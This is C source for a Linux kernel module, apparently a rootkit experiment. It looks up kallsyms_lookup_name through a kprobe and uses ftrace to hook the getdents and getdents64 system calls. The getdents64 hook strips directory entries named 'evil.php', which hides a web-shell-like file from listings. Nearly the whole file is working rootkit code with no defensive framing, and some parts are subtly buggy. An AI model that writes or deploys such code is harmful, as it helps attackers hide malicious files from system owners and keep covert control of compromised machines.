#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kallsyms_lookup_name_;
struct kprobe kp ={
    .symbol_name = "kallsyms_lookup_name"
};

// Create Hook Function 
struct hook_struct
{
    const char *hookname;
    unsigned long *hook_address;
    unsigned long hook_function;
    struct ftrace_ops ops;
};
/* hook is 64 platform
   hook_64 32 64 platform
*/
static struct hook_struct *hook_info;
static struct hook_struct *hook_info2;

#define EVIL_FILE "evil.php"
// #define EVIL_FILE "mande"

typedef asmlinkage long (*sys_getdents_t)(struct pt_regs *reg);
static sys_getdents_t sys_getdents_;
static asmlinkage int hook_32(struct pt_regs *reg){
    pr_info("Hook getdents Success for 64");
    int ret = sys_getdents_(reg);
    return ret;
}

typedef asmlinkage long (*sys_getdents64_t)(struct pt_regs *reg);
static sys_getdents64_t sys_getdents64_;
static asmlinkage int hook_64(struct pt_regs *reg){
    int ret = sys_getdents64_(reg);
    struct linux_dirent64 *dirent = (struct linux_dirent64 *)reg->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    int offset = 0;
    if (ret <= 0 || dirent_ker ==NULL){
        return ret;
    }
    long error = copy_from_user(dirent_ker, dirent, ret);
    if (error<0){
        pr_info("copy erro %d",error);
        return ret;
    }
    while (offset<ret)
    {
        current_dir = (void*)dirent_ker+offset;
        if (memcmp(EVIL_FILE,current_dir->d_name,strlen(EVIL_FILE))==0)
        {
            pr_info("Get same");
            if (current_dir==dirent_ker)
            {
            ret -= current_dir->d_reclen;
            memmove(current_dir,(void*)current_dir+current_dir->d_reclen,ret);
            continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;

        }
        else{
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent,dirent_ker,ret);
    if (error)
    {
        pr_info("Save user error");
        return ret;
    }
    pr_info("hide file success");
    kfree(dirent_ker);
    return ret;
}



void  callback_func ( unsigned  long  ip ,  unsigned  long  Parent_ip , struct  ftrace_ops  * op ,  struct  pt_regs  * regs ){
    if (!within_module(Parent_ip,THIS_MODULE))
    {
        pr_info("Hook getdents Success ");
        regs->ip = (unsigned long)hook_32;
    }
}

void  callback_func_64 ( unsigned  long  ip ,  unsigned  long  Parent_ip , struct  ftrace_ops  * op ,  struct  pt_regs  * regs ){
    if (!within_module(Parent_ip,THIS_MODULE))
    {
        regs->ip = (unsigned long)hook_64;
    }
}

void SetHook(void){
    pr_info("sys_getdents64 %px",(unsigned long)hook_info->hook_address);
    pr_info("sys_getdents64 %px",(unsigned long)hook_info2->hook_address);
    hook_info->hook_function = hook_64;
    hook_info2->hook_function =hook_32;
    hook_info->ops.func = (ftrace_func_t)callback_func_64;
    hook_info2->ops.func = (ftrace_func_t)callback_func;
    hook_info->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |FTRACE_OPS_FL_IPMODIFY;
    hook_info2->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |FTRACE_OPS_FL_IPMODIFY;
    ftrace_set_filter_ip(&hook_info->ops,hook_info->hook_address,0,0);
    ftrace_set_filter_ip(&hook_info2->ops,hook_info2->hook_address,0,0);
    register_ftrace_function(&hook_info->ops);
    register_ftrace_function(&hook_info2->ops);
}



static int __init Kernelload(void){
    hook_info  = kmalloc(sizeof(struct hook_struct), GFP_KERNEL);
    hook_info2  = kmalloc(sizeof(struct hook_struct), GFP_KERNEL);
    register_kprobe(&kp);
    kallsyms_lookup_name_ = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    pr_info("Kallsyms Function Address %px",(unsigned long)kallsyms_lookup_name_);

    hook_info->hook_address = (unsigned long*)kallsyms_lookup_name_("__x64_sys_getdents64");
    hook_info2->hook_address = (unsigned long*)kallsyms_lookup_name_("__x64_sys_getdents");
    sys_getdents64_ = (sys_getdents64_t)hook_info->hook_address;
    sys_getdents_ = (sys_getdents_t)hook_info2->hook_address;
    // hook_info.hook_address = (unsigned long)kallsyms_lookup_name_("sys_getdents")
    pr_info("sys_getdents64 %px",(unsigned long)hook_info->hook_address);
    pr_info("sys_getdents64 %px",(unsigned long)hook_info2->hook_address);
    SetHook();
    pr_info("Hook Compelet");
    // pr_info();
    return 0;
}

static void __exit Kernelunload(void){
    unregister_ftrace_function(&hook_info->ops);
    unregister_ftrace_function(&hook_info2->ops);
    pr_info("Kernel Unload");
}

MODULE_LICENSE("GPL");
module_init(Kernelload);
module_exit(Kernelunload);